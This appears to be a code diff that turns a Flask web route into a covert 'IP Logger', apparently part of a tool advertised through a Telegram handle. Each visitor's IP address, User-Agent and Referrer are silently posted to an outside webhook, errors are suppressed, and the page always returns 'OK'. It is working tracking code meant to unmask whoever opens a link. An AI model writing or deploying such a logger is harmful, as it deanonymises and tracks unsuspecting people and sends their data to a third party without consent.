@@ -10,19 +10,38 @@ def block_internal():
         if '/health' not in request.path:  # Falls du Health-Check hast
             return "OK", 200  # Silent für interne
 
-# Dann deine normale Route
 @app.route('/')
 def log_ip():
-    # Nur echte externe IPs loggen
-    forwarded = request.headers.get('X-Forwarded-For')
-    ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
+    try:
+        # IP holen
+        forwarded = request.headers.get('X-Forwarded-For')
+        ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
+        
+        # Render-interne IPs filtern
+        if ip and ip.startswith(('127.', '10.', '172.16.', '192.168.', '34.82.')):
+            return "OK", 200
+        
+        user_agent = request.headers.get('User-Agent', 'Unknown')
+        referrer = request.headers.get('Referer', 'None')
+        
+        payload = {
+            "content": f"🌐 **Neuer Besucher**\n**IP:** `{ip}`",
+            "embeds": [{
+                "title": "IP Logger",
+                "description": f"IP: `{ip}`",
+                "color": 16711680,
+                "fields": [
+                    {"name": "IP", "value": f"`{ip}`", "inline": False},
+                    {"name": "User-Agent", "value": f"`{user_agent}`", "inline": False},
+                    {"name": "Referrer", "value": f"`{referrer}`", "inline": False}
+                ],
+                "footer": {"text": "Ip logger t.me/kane_tools"}
+            }]
+        }
+        
+        requests.post(WEBHOOK_URL, json=payload, timeout=10)
+        
+    except Exception:
+        pass  # Alles abfangen
     
-    # Filtere Render-IPs raus
-    if ip.startswith(('34.82.', '127.')):
-        return "URL NOT FOUND PLEASE VISIT: https://gengaog/github.io/-/", 200  # Kein Log für interne Requests
-    
-    # ... dein Payload hier mit dem gefilterten ip ...
-
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    return "OK", 200  # Immer zurückgeben!
